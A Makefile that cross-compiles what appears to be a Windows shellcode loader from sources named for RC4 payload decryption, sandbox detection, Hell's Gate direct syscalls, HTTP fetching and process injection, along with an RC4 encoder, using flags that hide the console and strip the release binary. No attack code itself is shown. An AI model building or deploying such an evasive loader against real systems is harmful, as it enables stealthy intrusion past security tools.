CC        = x86_64-w64-mingw32-gcc
CC_LINUX  = gcc
CFLAGS    = -g
LDFLAGS   = -static -mwindows -lwinhttp
BUILDDIR  = build

LOADER_SRC = main.c rc4.c sandbox.c hellsgate.c http.c inject.c
ENCODER_SRC = encode2rc4.c rc4.c

# ---- Default: build both targets ----
all: $(BUILDDIR)/loader.exe $(BUILDDIR)/encode2rc4.exe

$(BUILDDIR):
	mkdir -p $(BUILDDIR)

# ---- Windows loader ----
$(BUILDDIR)/loader.exe: $(LOADER_SRC) | $(BUILDDIR)
	$(CC) $(CFLAGS) -o $@ $(LOADER_SRC) $(LDFLAGS)

# ---- Windows RC4 encoder ----
$(BUILDDIR)/encode2rc4.exe: $(ENCODER_SRC) | $(BUILDDIR)
	$(CC) $(CFLAGS) -static -o $@ $(ENCODER_SRC)

# ---- Linux RC4 encoder ----
encode2rc4-linux: $(BUILDDIR)/encode2rc4-linux

$(BUILDDIR)/encode2rc4-linux: $(ENCODER_SRC) | $(BUILDDIR)
	$(CC_LINUX) $(CFLAGS) -o $@ $(ENCODER_SRC)

# ---- Debug: with console output (no -mwindows) ----
debug: $(LOADER_SRC) | $(BUILDDIR)
	$(CC) -g -o $(BUILDDIR)/loader.exe $(LOADER_SRC) -static -lwinhttp

# ---- Release: optimized + stripped ----
release: $(LOADER_SRC) | $(BUILDDIR)
	$(CC) -Os -s -o $(BUILDDIR)/loader.exe $(LOADER_SRC) $(LDFLAGS)

# ---- Clean ----
clean:
	rm -rf $(BUILDDIR)/*

.PHONY: all encode2rc4-linux debug release clean
